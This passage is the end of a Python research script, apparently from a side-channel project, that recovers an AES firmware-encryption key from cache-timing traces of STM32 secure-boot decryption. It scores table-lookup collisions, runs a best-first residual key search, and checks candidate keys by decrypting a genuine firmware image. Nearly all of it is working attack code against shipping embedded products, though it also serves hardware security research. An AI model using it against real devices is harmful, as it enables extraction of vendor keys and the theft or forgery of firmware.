    ap.add_argument("--pairs", default="all")
    ap.add_argument("--ladder", action="store_true",
                    help="score at prefixes, so the trace count is bounded "
                         "from below as well as quoted")
    ap.add_argument("--rungs", nargs="*", default=None, type=int)
    ap.add_argument("--depth", type=int, default=4,
                    help="per-byte candidates the best-first residual walks; "
                         "1 tries the solver's assignment alone")
    ap.add_argument("--depth-limit", type=int, default=16,
                    help="how many assignments the walk pops before giving "
                         "up; each one costs a 2**23 low-bit search")
    ap.add_argument("--ranks", action="store_true",
                    help="where the true masked bytes rank, so a 15-of-16 run "
                         "is quoted as a residual search rather than as a "
                         "failure (uses the key; a diagnostic, not an attack)")
    ap.add_argument("--control", action="store_true",
                    help="known-key control: the per-collision effect and the "
                         "residual, which is what prices the campaign")
    ap.add_argument("--profile", action="store_true",
                    help="per-pair prominence with no key, to see whether "
                         "there is a cliff and where")
    ap.add_argument("--finish", action="store_true",
                    help="resolve the residual and verify against a genuine "
                         "image's plaintext")
    ap.add_argument("--genuine", default=os.path.join(HERE, "fw.sfb"))
    ap.add_argument("--plain", default=os.path.join(HERE, "fw.plain"))
    ap.add_argument("--meta", default=os.path.join(HERE, "fw.meta"))
    ap.add_argument("--detrend", action="store_true")
    ap.add_argument("--cut", type=float, default=0.0)
    ap.add_argument("--sim", type=int, default=0,
                    help="run on N simulated intervals instead of a capture")
    ap.add_argument("--sim-noise", type=float, default=0.0)
    ap.add_argument("--check-ref", type=int, default=0, metavar="BLOCKS",
                    help="score BLOCKS of the REFERENCE model's own stream "
                         "both ways and refuse to differ; run this before "
                         "trusting anything else here")
    ap.add_argument("--sim-chunk", type=int, default=32,
                    help="AES blocks per simulated observation.  1 is the "
                         "per-block case flashattack implements and is here "
                         "to check the INDEX model with the chunking penalty "
                         "removed; 32 is ST's shipped chunk size")
    ap.add_argument("--seed", type=int, default=20261015)
    ap.add_argument("--key", default=None,
                    help="ground truth, for scoring only; default is this "
                         "project's OEM_KEY_COMPANY1")
    a = ap.parse_args()

    if a.check_ref:
        return check_ref(a.check_ref)

    key = bytes.fromhex(a.key or GROUND_TRUTH)
    from flashattack import aesref
    rk = aesref.key_expansion(key)
    k10 = np.array(rk[10], dtype=np.int64)
    k0 = np.array(rk[0], dtype=np.int64)

    simulated = bool(a.sim)
    if a.sim:
        chunk_blocks = a.sim_chunk
        cyc, ct, pas = sim_intervals(a.sim, chunk_blocks, a.sim_noise,
                                     a.seed, key)
        meta = dict(chunk=chunk_blocks * 16, variant="SIMULATED",
                    board="none", tampered=1, passes=1,
                    files=["sim x%d" % a.sim])
        # The simulation runs flashsim's FORWARD cipher as the round-1
        # isomorph of the inverse one, so the round key XORed into the chosen
        # input is rk[0] -- for AES-128 the key itself -- and not the inverse
        # cipher's rk[10].  Scoring a simulated run against k10 tests a
        # relation the simulated access stream does not have, and reads as a
        # clean null: 1/120 pairs, which is chance.  That is the mistake
        # FINDINGS_LEDGER section D is about, made here against the model
        # rather than against the silicon, which is the cheap place for it.
        k10 = np.array(rk[0], dtype=np.int64)
    else:
        paths = []
        for g in a.npz:
            paths += glob.glob(g) if any(c in g for c in "*?[") else [g]
        if not paths:
            ap.error("no captures given")
        cyc, ct, pas, meta = load(paths)

    print("%d intervals, %d passes, chunk %d B (%d AES blocks), variant %s"
          % (len(cyc), meta["passes"], meta["chunk"], meta["chunk"] // 16,
             meta["variant"]))
    print("  RT0 0x%08x mod 32 == %d    RSb 0x%08x mod 32 == %d"
          % (RT0_ADDR, RT0_ADDR % 32, RSB_ADDR, RSB_ADDR % 32))
    # THE UNIT IS NOT ALWAYS A CORE CYCLE.  A self-instrumented capture counts
    # DWT cycles at 80 MHz; a bus-side one counts F303 timer ticks at 64 MHz,
    # 15.625 ns each.  Everything downstream is a difference of intervals in
    # whatever that unit is, so the arithmetic does not care -- but a reader
    # comparing a per-collision effect between the two does, so the unit is
    # named here rather than assumed to be cycles.
    unit, hz = "cycles", 80_000_000
    if meta.get("observer"):
        unit, hz = "ticks", meta["tick_hz"]
        print("  observer %s, %.3f ns per %s"
              % (meta["observer"], 1e9 / hz, unit))
    print("  median %d %s, sd across chunks %.1f (%.2f ns)"
          % (np.median(cyc), unit, np.std(cyc), np.std(cyc) * 1e9 / hz))

    y, keep, dr = deskew(cyc, pas, detrend=a.detrend, cut=a.cut)
    if a.cut > 0 or a.detrend:
        print("  deskew: kept %d of %d, detrend %s"
              % (keep.sum(), len(keep), dr or "off"))
    cyc, ct, y, pas = cyc[keep], ct[keep], y[keep], pas[keep]

    rounds = ["first", "last"] if a.round == "both" else [a.round]
    pairs = pairs_for(a.pairs)
    print("  %d pairs (%s)" % (len(pairs), a.pairs))

    for rnd in rounds:
        if rnd == "last" and simulated:
            print("\n== round 10 is not simulated here: the stand-in is the "
                  "FORWARD cipher, whose last round indexes the S-box at the "
                  "round-9 state and not at FSb[a ^ K0].  Score it on real "
                  "traces or not at all.")
            continue
        if rnd == "last":
            print("\n== round 10, RSb -- the simulated null is for an ALIGNED "
                  "table and this one is at mod 32 == 8")
            data_src = aes_output(ct, key, meta["chunk"])
            truth = k0
        else:
            print("\n== round 1, RT0")
            data_src = None
            truth = k10

        for geo in geometries(a.geometry, rnd):
            print("  %s" % geo)
            blocks, yb = expand(ct, y, meta["chunk"])
            data = blocks if data_src is None else data_src
            if a.control:
                src = ct if data_src is None else \
                    data_src.reshape(len(ct), meta["chunk"])
                known_key_control(src, y, truth, geo, pairs, meta["chunk"],
                                  sub=sub_for(rnd))
            marks = (ladder_marks(len(cyc), a.rungs) if a.ladder
                     else [len(cyc)])
            for m in marks:
                nb = m * (meta["chunk"] // 16)
                if rnd == "first":
                    scored, ok = score_round1(data[:nb], yb[:nb], geo, pairs,
                                              truth, verbose=not a.ladder)
                    v = solve_deltas(scored, geo)
                    want = ((truth ^ truth[0]) >> geo.shift) & 0xFF
                    nv = int((v == want).sum())
                    print("    %7d intervals (%8d blocks): %3d/%d pairs, "
                          "%2d/16 masked bytes consistent"
                          % (m, nb, ok, len(pairs), nv))
                    if a.ranks:
                        report_ranks(marginal_surfaces(scored, geo, v), v,
                                     truth, geo)
                    if a.profile:
                        proms = sorted((r["prom"] for r in scored.values()),
                                       reverse=True)
                        print("      prominence: top %s ... median %.2f"
                              % (" ".join("%.2f" % p for p in proms[:6]),
                                 float(np.median(proms))))
                    # The ladder stops at the first rung that yields a KEY,
                    # not at the first rung whose masked bytes happen to agree
                    # with the truth: "smallest verified prefix, with the rung
                    # below it failing" is the repository's convention and the
                    # plaintext check is what verifies it.
                    if a.finish and run_finish(v, geo, a, key, scored):
                        print("    floor: %d intervals (%d AES blocks) is the "
                              "smallest rung here that yields the key"
                              % (m, nb))
                        break
                else:
                    ok, cand = score_round10(data[:nb], yb[:nb], geo, pairs,
                                             truth)
                    good = verify_key(cand, a)
                    print("    %7d intervals (%8d blocks): %2d/16 key bytes, "
                          "candidate %s%s"
                          % (m, nb, ok, cand.hex(),
                             "" if good is None else
                             ("  DECRYPTS THE GENUINE IMAGE" if good
                              else "  does not decrypt")))
                    if good:
                        print("    ground truth %s -- %s"
                              % (key.hex(),
                                 "MATCH" if cand == key else "MISMATCH"))
                        break
    return 0


def aes_output(ct, key, chunk):
    """The inverse cipher's own output per block, which round 10 indexes by.

    A TAMPERED body decrypts to nothing anyone knows, so this cannot come from
    the capture: rigs/host/sbsfu_image.py deletes the .plain for exactly that
    reason.  It is reconstructed with the key instead, and that is a statement
    about the ADVERSARY rather than about the traces -- a known-plaintext
    attacker holding the vendor's release binary computes the same numbers
    from public bytes, and nothing about the measured cycles changes either
    way.  It is therefore a legitimate scoring of round 10 on real traces and
    NOT a key recovery: --round last can never be the thing that recovers the
    key here, only the thing that says whether the channel is there.
    """
    from flashattack import aesref
    rk = aesref.key_expansion(key)
    n, cb = ct.shape
    blocks = ct.reshape(n * (cb // 16), 16)
    return aesref.decrypt_blocks_rk(rk, blocks).astype(np.int64)


def score_round10(data, y, geo, pairs, truth):
    """Best-margin candidate per byte over every pair, as the samd21 run() does.

    Per byte by highest margin rather than by a margin-weighted sum: the
    stm32l475 dossier's §5e records that distinction costing one wrong byte in
    sixteen when it was first written as a sum.

    Round 10 recovers K0 -- the AES key itself -- so there is no residual and
    no schedule to invert.  It needs the plaintext, which the round-1 attack
    does not; see aes_output() for what that assumption is and is not.
    """
    sub = fsb()
    best = {}
    for (a, b) in pairs:
        sc = pair_scores_2d(data, y, a, b, geo, sub)
        fin = sc[np.isfinite(sc)]
        if not fin.size:
            continue
        med, sd = np.median(fin), fin.std() + 1e-12
        ia, ib = np.unravel_index(np.argmin(sc), sc.shape)
        mg = float((med - sc[ia, ib]) / sd)
        for j, val in ((a, int(ia)), (b, int(ib))):
            if j not in best or mg > best[j][1]:
                best[j] = (val, mg)
    cand = bytes(best.get(j, (0, 0))[0] for j in range(16))
    return sum(1 for j, (val, _) in best.items() if val == int(truth[j])), cand


def verify_key(cand, a):
    """Does this key actually decrypt the genuine image?  No truth involved."""
    if not (os.path.exists(a.genuine) and os.path.exists(a.plain)):
        return None
    from flashattack import aesref
    body = open(a.genuine, "rb").read()[512:]
    pt = open(a.plain, "rb").read()
    iv = cbc_iv(a.meta)
    rk = aesref.key_expansion(cand)
    blk = np.frombuffer(body[:16], dtype=np.uint8).reshape(1, 16)
    got = aesref.decrypt_blocks_rk(rk, blk)[0]
    want = np.frombuffer(pt[:16], dtype=np.uint8) ^ np.frombuffer(iv, np.uint8)
    return bool((got == want).all())


def run_finish(v, geo, a, key, scored=None):
    """Try the solver's assignment, then its neighbours in best-first order.

    Insisting on 16 of 16 masked bytes throws away a run that is one byte off,
    and one byte off is not a failed attack: on this directory's second batch
    at 5 110 intervals fifteen bytes ranked 0 and one ranked 1, which is a
    2**24 search rather than a 2**23 one -- twice the work, same key.  So the
    attack walks the product of the per-byte rankings in ascending total cost
    (flashattack.search.best_first_indices, which is what the mpc5606b and
    snmpv3 campaigns enumerate with) and runs the low-bit search for each
    assignment it pops.  The quoted residual is then pops * 2**23, measured,
    not the first assignment's alone.
    """
    if scored is None or a.depth <= 1:
        return _finish_one(v, geo, a, key)

    from flashattack.search import best_first_indices

    surf = marginal_surfaces(scored, geo, v)
    ng = 1 << geo.bits
    vals, cands = [], []
    for j in range(1, 16):
        order = np.argsort(-surf[j])[:a.depth]
        sd = surf[j].std() or 1.0
        vals.append([float((surf[j][order[0]] - surf[j][o]) / sd)
                     for o in order])
        cands.append([int(o) for o in order])
    pops = 0
    for idx, tot in best_first_indices(vals, a.depth_limit):
        trial = np.zeros(16, dtype=np.int64)
        for j in range(1, 16):
            trial[j] = cands[j - 1][idx[j - 1]]
        pops += 1
        if _finish_one(trial, geo, a, key, quiet=pops > 1):
            print("    found at best-first assignment %d, so the residual "
                  "actually searched is %d * 2**%d = 2**%.1f"
                  % (pops, pops, 8 + 15 * geo.shift,
                     np.log2(pops) + 8 + 15 * geo.shift))
            return True
    print("    no key in the first %d best-first assignments (2**%.1f "
          "candidates)" % (pops, np.log2(max(pops, 1)) + 8 + 15 * geo.shift))
    return False


def _finish_one(v, geo, a, key, quiet=False):
    if not (os.path.exists(a.genuine) and os.path.exists(a.plain)):
        print("    --finish needs a genuine image and its plaintext (%s, %s)"
              % (a.genuine, a.plain))
        return False
    raw = open(a.genuine, "rb").read()
    body = raw[512:]
    pt = open(a.plain, "rb").read()
    iv = cbc_iv(a.meta)
    got, tried, rk10 = finish(v, geo, body[:16], pt[:16], iv, quiet=quiet)
    if got is None:
        if not quiet:
            print("    residual search exhausted %d candidates, no key"
                  % tried)
        return False
    print("    KEY %s after %d candidates" % (got.hex(), tried))
    print("    ground truth %s -- %s"
          % (key.hex(), "MATCH" if got == key else "MISMATCH"))
    return got == key


if __name__ == "__main__":
    raise SystemExit(main())
